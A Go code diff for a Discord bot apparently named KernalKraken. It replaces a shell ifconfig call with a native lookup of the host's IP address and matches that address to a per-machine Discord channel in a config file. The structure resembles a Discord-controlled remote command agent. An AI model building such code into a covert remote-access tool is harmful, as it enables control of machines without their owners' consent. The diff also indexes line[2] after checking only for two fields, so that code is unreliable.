@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -52,26 +53,40 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 }
 
+func getLocalIP() (string, error) {
+	// Get a list of network interfaces on the machine
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		return "", err
+	}
+
+	// Loop through the network interfaces to find the IP address
+	for _, iface := range ifaces {
+		addrs, err := iface.Addrs()
+		if err != nil {
+			return "", err
+		}
+		for _, addr := range addrs {
+			switch v := addr.(type) {
+			case *net.IPNet:
+				if !v.IP.IsLoopback() && v.IP.To4() != nil {
+					return v.IP.String(), nil
+				}
+			}
+		}
+	}
+
+	// Return an error if no IP address is found
+	return "", fmt.Errorf("no IP address found")
+}
+
 func setup() string {
-	ip, channelID := "", ""
-	cmd := exec.Command("/bin/bash", "-c", "ifconfig")
-	out, err := cmd.Output()
+	ip, err := getLocalIP()
 	if err != nil {
 		fmt.Println(err)
 	}
 
-	for {
-		if strings.Contains(string(out), "inet ") {
-			ip = string(out[strings.Index(string(out), "inet ")+5 : strings.Index(string(out), "netmask:")-1])
-			if(ip == "127.0.0.1"){
-				ip = ""
-				out = out[strings.Index(string(out), "inet") +1 :]
-			}else{
-				break;
-			}
-		}
-
-	}
+	ip = strings.Replace(ip, ".", "-", -1)
 
 	file, err := os.Open("KernalKraken_config.txt")
 	if err != nil {
@@ -80,8 +95,9 @@ func setup() string {
 	defer file.Close()
 
 	scanner := bufio.NewScanner(file)
+	channelID := ""
 	for scanner.Scan() {
-		if scanner.Text() == ip {
+		if strings.Contains(scanner.Text(), ip) {
 			line := strings.Split(scanner.Text(), " ")
 			if len(line) > 1 {
 				channelID = line[2]
